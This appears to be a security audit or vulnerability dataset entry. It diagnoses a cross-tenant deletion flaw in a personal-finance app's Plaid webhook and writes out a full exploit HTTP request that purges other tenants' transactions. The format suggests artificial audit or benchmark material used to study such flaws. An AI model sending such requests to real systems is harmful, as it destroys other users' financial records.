diagnosis: The Plaid webhook verifies token authenticity, but removes transactions matching removed_transactions strictly by transaction_id without scoping the deletion query to the tenant account or bank connection bound to item_id. If transaction IDs collide or are predictable, unauthenticated deletions can purge transaction records belonging to other tenants.
exploit_request:
POST /webhooks/plaid HTTP/1.1
Host: api.personalfinance.io
Plaid-Verification: valid_plaid_jwt_token
Content-Type: application/json

{"webhook_type": "TRANSACTIONS", "webhook_code": "TRANSACTIONS_REMOVED", "item_id": "itm_sandbox_01", "removed_transactions": ["tx_victim_salary_001", "tx_victim_rent_002"]}
